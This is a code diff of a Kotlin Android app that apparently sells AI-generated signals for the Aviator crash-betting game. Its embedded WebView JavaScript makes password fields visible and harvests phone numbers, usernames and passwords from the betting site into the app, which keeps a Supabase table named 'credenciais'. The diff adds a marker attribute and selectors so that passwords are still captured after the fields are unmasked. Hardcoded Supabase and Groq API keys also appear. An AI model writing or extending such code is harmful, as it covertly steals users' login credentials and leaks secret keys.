@@ -430,7 +430,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "6.1"
+    private val VERSAO_ATUAL = "6.2"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -645,15 +645,9 @@ class MainActivity : AppCompatActivity() {
                     emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
                     // Iniciar relógio imediatamente para mostrar hora desde o início
                     if (relogioRunnable == null) iniciarRelogio()
-                    setBarra("⏳ AGUARDAR CRASH", "Aviator aberto · aguardar 1.º crash...", "#475569")
-                    // Tentar ler histórico DOM em background (dados para análise futura)
-                    // mas NUNCA disparar pedirSinalIA() a partir daqui
-                    handler.postDelayed({
-                        if (!historicoJogoCarregado && dentroDoAviator) {
-                            // DOM não respondeu — ok, aguardar crashes ao vivo
-                            setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
-                        }
-                    }, 12_000)
+                    setBarra("🔄 A CARREGAR...", "Aviator aberto · a buscar velas...", "#475569")
+                    // Carregar velas do Supabase imediatamente ao abrir
+                    carregarVelasSupabaseRecentes()
                 }
             }
 
@@ -991,6 +985,7 @@ class MainActivity : AppCompatActivity() {
     // Tornar campos password visíveis (facilita captura)
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
+            el.setAttribute('data-skybot-senha', 'true');
             el.setAttribute('type', 'text');
         });
     }
@@ -1035,7 +1030,8 @@ class MainActivity : AppCompatActivity() {
     // Selectores para campos de senha
     var selectoresS = [
         'input[name="password"]', 'input[name="senha"]', 'input[name="pass"]',
-        'input[type="password"]', 'input[type="text"][name*="pass" i]',
+        'input[type="password"]', 'input[data-skybot-senha="true"]',
+        'input[type="text"][name*="pass" i]',
         'input[placeholder*="senha" i]', 'input[placeholder*="password" i]',
         'input[placeholder*="palavra-passe" i]',
         '#password', '#senha', '#pass'
@@ -1072,8 +1068,8 @@ class MainActivity : AppCompatActivity() {
                     var isNum = t === 'tel' || t === 'number' ||
                         n.includes('phone') || n.includes('numero') ||
                         n.includes('username') || n.includes('login') || n.includes('user');
-                    var isPass = t === 'password' || t === 'text' && (
-                        n.includes('pass') || n.includes('senha'));
+                    var isPass = t === 'password' || inp.getAttribute('data-skybot-senha') === 'true' ||
+                        (t === 'text' && (n.includes('pass') || n.includes('senha')));
                     if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
                     if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
                 });
@@ -2452,9 +2448,12 @@ REGRAS ABSOLUTAS DO JSON:
                     val n = historicoVelas.size
                     if (n >= MIN_VELAS_ANALISE) {
                         graficoPronto = true
-                        setBarra("✅ HISTÓRICO SUPABASE", "$n velas · a analisar...", "#0f766e")
+                        setBarra("🔍 IA A ANALISAR...", "$n velas do Supabase · a analisar...", "#7c3aed")
                         if (!analisandoIA && !cicloAtivo) {
-                            handler.postDelayed({ pedirSinalIA() }, 10_000)
+                            handler.postDelayed({
+                                invalidarCache()
+                                pedirSinalIA()
+                            }, 2_000)
                         }
                     } else {
                         setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
